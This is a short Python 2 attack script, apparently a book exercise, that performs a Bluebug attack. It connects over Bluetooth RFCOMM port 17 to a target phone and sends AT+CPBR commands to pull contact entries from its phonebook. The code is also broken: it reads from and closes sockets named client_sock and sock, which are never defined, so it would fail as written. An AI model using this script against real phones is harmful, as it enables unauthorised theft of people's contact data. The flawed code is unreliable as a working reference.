#!/usr/bin/env python
import bluetooth

def banner():
	print "[***]	Bluebug a phone p209	[***]"

def main():
	tgtPhone = "AA:BB:CC:DD:EE:FF"
	port = 17
	phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
	phoneSock.connect((tgtPhone, port))
	for contact in range(1,5):
		atCmd='AT+CPBR='+str(contact)+'\n'
		phoneSock.send(atCmd)
		result=client_sock.recv(1024)
		print '[+] '+str(contact)+': '+result
	sock.close()

if __name__ == '__main__':
	main()